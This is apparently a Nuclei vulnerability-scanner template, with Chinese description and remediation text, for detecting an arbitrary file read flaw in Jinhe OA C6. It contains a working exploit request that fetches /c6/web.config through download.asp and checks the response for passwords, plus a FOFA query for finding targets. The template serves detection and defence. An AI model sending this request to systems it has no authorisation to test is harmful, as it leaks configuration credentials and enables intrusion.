id: jinhe-oa-c6-lfi

info:
  name: Jinhe OA C6 download.jsp - Arbitrary - 任意文件读取漏洞
  author: SleepingBag945
  severity: high
  description: |
    该模板用于检测 Jinhe OA C6 download.jsp - Arbitrary - 任意文件读取漏洞。该类漏洞通常源于文件路径、下载参数或资源加载接口缺少目录穿越和权限校验，导致任意文件被读取或包含。模板会向 `/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可读取配置文件、源码、日志、密钥或系统敏感文件。
    - 若文件包含点可被利用，可能进一步造成代码执行、凭据泄露或对内部系统的持续入侵。
  remediation: |
    - 对文件访问参数使用固定映射或白名单，禁止直接使用用户输入拼接文件路径。
    - 规范化并校验最终路径，阻断 `../`、编码绕过和绝对路径访问。
    - 限制应用进程的文件系统权限，避免配置、密钥和日志被 Web 服务账号读取。
  classification:
    cwe-id: CWE-22,CWE-73
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="金和网络-金和OA"
  tags: jinhe,lfi,misconfig,vuln

http:
  - method: GET
    path:
      - '{{BaseURL}}/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config'

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body,"<configuration>") && contains(body,"password=")'
          - 'contains(header,"filename=") && contains(header,"application/octet-stream")'
        condition: and
